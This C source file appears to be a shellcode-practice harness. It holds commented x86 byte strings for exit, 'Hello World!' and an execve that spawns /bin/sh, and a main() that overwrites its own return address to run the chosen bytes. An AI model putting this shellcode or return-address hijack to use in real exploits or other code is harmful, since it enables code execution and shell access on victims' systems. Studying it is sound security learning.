#include <stdio.h>
#include <unistd.h>

char exit_code[] = "\x31\xc0"			// xor    %eax,%eax
	"\xb0\x01"							// mov    $0x1,%al
	"\xcd\x80";							// int    $0x80

char hello_world_code[] = "\xeb\x14"	// jmp    8048076 <_start+0x16>
	"\x31\xc0"							// xor    %eax,%eax
	"\xb0\x04"							// mov    $0x4,%al
	"\x31\xdb"							// xor    %ebx,%ebx
	"\x43"								// inc    %ebx
	"\x59"								// pop    %ecx
	"\x31\xd2"							// xor    %edx,%edx
	"\xb2\x0d"							// mov    $0xd,%dl
	"\xcd\x80"							// int    $0x80
	"\x31\xc0"							// xor    %eax,%eax
	"\xb0\x01"							// mov    $0x1,%al
	"\xcd\x80"							// int    $0x80
	"\xe8\xe7\xff\xff\xff"				// call   8048062 <_start+0x2>
	"Hello World!";

char shellcode[] = 	"\xeb\x15"			// jmp    8048077 <_start+0x17>
	"\x31\xc0"							// xor    %eax,%eax
	"\x50"								// push   %eax
	"\x5a"								// pop    %edx
	"\x5b"								// pop    %ebx
	"\x50"								// push   %eax
	"\x89\xd8"							// mov    %ebx,%eax
	"\x50"								// push   %eax
	"\x54"								// push   %esp
	"\x59"								// pop    %ecx
	"\x31\xc0"							// xor    %eax,%eax
	"\xb0\x05"							// mov    $0x5,%al
	"\x04\x05"							// add	  $0x5,%al
	"\xfe\xc0"							// inc    %al
	"\xcd\x80"							// int    $0x80
	"\xe8\xe6\xff\xff\xff"				// call   8048062 <_start+0x2>
	"\x2f"								// das    
	"\x62\x69\x6e"						// bound  %ebp,0x6e(%ecx)
	"\x2f"								// das    
	"\x73\x68";							// jae    80480eb <_start+0x8b>

int main(int argc, char **argv) {
	int *ret; 
	//ret points to the return address now
	ret =  (int *)&ret + 2;
	switch (argv[1][0]) {
		case '1':	
			(*ret) = (int)exit_code; 
			break;
		case '2':
			(*ret) = (int)hello_world_code;
			break;
		default:
			(*ret) = (int)shellcode;
	}
	return 0;
}
